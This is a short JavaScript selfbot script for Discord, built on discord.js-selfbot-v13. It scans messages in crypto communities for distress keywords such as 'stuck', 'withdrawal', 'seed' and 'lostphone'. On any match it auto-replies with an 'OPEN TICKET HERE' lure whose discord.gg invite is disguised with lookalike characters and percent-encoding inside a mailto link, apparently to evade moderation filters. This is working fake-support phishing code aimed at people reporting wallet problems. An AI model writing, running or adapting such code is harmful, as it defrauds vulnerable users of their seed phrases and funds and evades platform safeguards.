// const { Client } = require('discord.js-selfbot-v13')

// const client = new Client({
//     checkupdate: false
// });

// Client.on('ready', async () =>{
//     console.log('Client is ready !')
// });

// client.on('messageCreate' , async(message)=>{
//     if (message.content.toLowerCase () === "test"){
//         message.reply("Test worked!")
//     }
// });

// client.login(process.env.TOKEN);

const { Client } = require('discord.js-selfbot-v13');

const client = new Client({
    checkUpdate: false
});

// Array of keywords to detect (case insensitive)
const keywords = [
    "point", "help", "token", "stuck", "closed", "liquidity", "withdrawal", "collateral", 
    "hack", "rug", "scam", "gas", "delay", "fork", "ban", "tax", "dump", "dust", "spam", 
    "bridge", "key", "custody", "bot", "vol", "whale", "fake", "freeze", "slash", "burn", 
    "lock", "liquidation", "shortage", "inflation", "exploit", "claim", "risk", "downtime", 
    "attack", "spamdrop", "drain", "insider", "front-run", "miner", "double-spend", "orphan", 
    "centralize", "downgrade", "bug", "fee", "error", "crash", "limit", "wash", "blind", 
    "censor", "forked", "halt", "theft", "clone", "malicious", "breach", "banned", "rugged", 
    "phish", "jail", "seize", "shutdown", "blacklist", "freezeout", "bribe", "kickback", 
    "compromise", "loss", "wipe", "ghost", "abandon", "scamdrop", "risky", "exit", "cheat", 
    "backdoor", "drainage", "trap", "oversupply", "underpay", "spamgas", "jam", "timeout", 
    "spamtx", "copycat", "hidden", "fail", "reorg", "squeeze", "locked", "illiquid", 
    "bankrun", "margin", "default", "debt", "insolvent", "seed", "password", "lost", "forgot", 
    "mistype", "wrongaddr", "lockedout", "revoke", "approve", "overapprove", "leakinfo", 
    "scamlink", "wrongchain", "wrongnet", "wrongtoken", "invalidsig", "noaccess", "lostphone", 
    "swapfail", "quotefail", "orderfail", "orderlag", "orderjam", "arbdrain", "mevbot", 
    "frontrunbot", "sandwichbot", "mevattack", "flashloan", "flashcrash", "flashdrain", 
    "borrowfail", "lendfail", "overlend", "underlend", "borrowdrain", "collateralfail", 
    "liquidationfail", "vaultdrain", "vaultfail", "rewardfail", "yieldfail", "rebasefail", 
    "farmdrain", "farmfail"
];

client.on('ready', async () => {
    console.log('Client is ready!');
});

client.on('messageCreate', async (message) => {
    // Don't respond to own messages
    if (message.author.id === client.user.id) return;
    
    const messageContent = message.content.toLowerCase();
    
    // Check if any keyword exists in the message (partial match)
    const foundKeyword = keywords.find(keyword => 
        messageContent.includes(keyword.toLowerCase())
    );
    
    if (foundKeyword) {
        console.log(`Detected keyword: ${foundKeyword} in message: ${message.content}`);
        
        // Reply with the specified message
        try {
            await message.reply("📨 * O𝐏ΕΝ ΤlCΚΕΤ 𝐇ΕRΕ*\n\n**[ <mailto:/#@%64%69%73%63%6F%72%64%2E%67%67/NMbC5Aggm6> ]**");
        } catch (error) {
            console.error('Error replying to message:', error);
        }
    }
});

client.login(process.env.TOKEN);

